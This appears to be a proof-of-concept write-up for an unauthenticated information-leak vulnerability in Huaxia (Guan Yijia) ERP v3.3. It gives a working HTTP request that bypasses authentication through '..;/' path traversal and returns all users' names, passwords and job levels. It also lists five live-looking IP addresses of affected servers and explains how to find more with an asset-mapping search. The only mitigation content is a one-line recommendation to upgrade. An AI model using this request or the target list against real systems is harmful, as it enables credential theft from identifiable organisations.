

## Product Introduction

Guan Yijia ERP (formerly known as Huaxia ERP) is based on the SpringBoot framework and SaaS model, aiming to provide open-source and user-friendly ERP software for small and medium-sized enterprises. Currently, it focuses on inventory management, finance, and production functions. The main modules include retail management, procurement management, sales management, warehouse management, financial management, report query, and system management, etc. It supports special features such as advance payment, income and expenditure, warehouse transfer, assembly and disassembly, and orders. It has reports such as product inventory and entry and exit statistics. At the same time, it has detailed and comprehensive control over roles and permissions, down to each button and menu.

## Vulnerability Description

There is an information leakage vulnerability in the Huaxia ERP system. By sending a data packet containing a payload, sensitive information such as usernames, passwords, and job levels can be returned. Due to the simplicity of exploiting this vulnerability, it is recommended that users immediately upgrade to version 3.5 or above to prevent its exploitation.

## Examples URLs affected by the vulnerability

```
http://121.228.124.38:8088/,https://222.71.147.35/,http://39.106.129.54:8081/,http://8.138.91.130:8088/,http://101.37.118.74:8890/
```

## POC

```http
GET /jshERP-boot/platformConfig/getPlatform/..;/..;/..;/jshERP-boot/user/getAllList HTTP/1.1
Host: <target host>
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

## Reproduction

Use the network asset mapping engine to search for "jshERP-boot" and enter a website that uses Huaxia ERP v3.3, no login required, and send a packet to get a response:

![image-20250225154253578](./image-20250225154253578.png)

The browser displays the following:

![image-20250225154604745](./image-20250225154604745.png)
